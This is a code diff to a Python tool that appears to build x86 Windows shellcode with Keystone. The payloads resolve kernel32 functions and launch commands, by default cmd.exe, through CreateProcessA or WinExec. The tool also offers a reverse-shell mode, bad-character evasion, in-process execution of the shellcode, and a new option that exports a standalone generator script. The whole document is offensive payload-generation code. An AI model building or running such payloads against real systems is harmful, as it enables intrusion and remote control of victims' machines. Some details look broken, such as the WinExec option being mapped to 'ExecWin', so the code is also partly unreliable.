@@ -25,6 +25,8 @@ parser.add_argument('-e', '--execute', action='store_true', help='Execute comman
 parser.add_argument('-f', '--force_break', action='store_true', help='Add int 3 to assembly to break on start', default=False)
 parser.add_argument('-b', '--bad_char', action='append', nargs=2, metavar=('HEX', 'METHOD'),
                    help='Bad character with hex value and method (neg/add[n]/dec[n])')
+parser.add_argument('-py', '--python_script', type=str, help='Create a clean Python script that generate the shellcode. Used when the whole shellcode_builder is not needed', default=None)
+parser.add_argument('-ex', '--exec', type=str, help='Execution function to use', choices=['CREATE_PROCESS', 'WIN_EXEC'], default='CREATE_PROCESS')
 
 args = parser.parse_args()
 
@@ -32,11 +34,13 @@ args = parser.parse_args()
 if not args.command:
    args.command = ['cmd.exe']
 
-
-
+execute_function = 'CreateProcessA'
+if args.exec == 'WIN_EXEC':
+    execute_function = 'ExecWin'
 
 asm_code = create_asm_start(args.force_break)
-asm_code += find_kernel32_and_resolve_functions()
+asm_code += find_kernel32()
+asm_code += resolve_kernel32_functions(execute_function, args.verbose)
 
 if args.lhost and args.lport:
     print_info(f'Creating a reverse shell payload', SUCCESS, 0, True)
@@ -66,11 +70,14 @@ if args.bad_char:
 count = 0
 for command in args.command:    
     print_info (f'Adding command:', SUCCESS, 0, True)
-    print_info (f'{command}', SUCCESS, 1, True)
+    print_info (f'{command}', SUCCESS, 1, args.verbose)
     cmd_chunks = change_command_to_memory_hex(command, bad_char_list, args.verbose)
     asm_code += create_startup_info_a(count)
     asm_code += create_command_string(cmd_chunks, count, args.verbose)
-    asm_code += create_process_a(count)
+    if args.exec == 'WIN_EXEC':
+        asm_code += exec_win(count)
+    else:
+        asm_code += create_process_a(count)
     count += 1
 
 ks = Ks(KS_ARCH_X86, KS_MODE_32)
@@ -79,23 +86,26 @@ force_assembly = False
 try:
     encoding, count = ks.asm(asm_code)
     print_info (f"Encoded {count} instructions", SUCCESS, 0, True)
-except: 
+
+    sh = b""
+    for e in encoding:
+        sh += struct.pack("B", e)
+
+    shellcode = bytearray(sh)
+
+    print_info(f'Shellcode:', SUCCESS, 0, True)
+    print_shellcode(shellcode, args.language)
+
+    if args.assembly or force_assembly:
+        print_info(f'Assembly:', SUCCESS, 1, args.verbose)
+        print_asm(asm_code)
+
+    if args.execute:
+        execute_shellcode(shellcode)
+
+    if args.python_script:
+        generate_python_script(asm_code, args.python_script)
+
+except Exception as e:
     print_info (f'Failed to compile the assembly:', FAIL, 0, True)
     force_assembly = True
-
-if args.assembly or force_assembly:
-    print_info (f'Assembly:', SUCCESS, 1, args.verbose)
-    print_asm (asm_code)
-
-
-sh = b""
-for e in encoding:
-    sh += struct.pack("B", e)
-
-shellcode = bytearray(sh)                   
-
-print_info (f'Shellcode:', SUCCESS, 0, True)
-print_shellcode(shellcode, args.language)
-
-if args.execute:
-   execute_shellcode(shellcode)
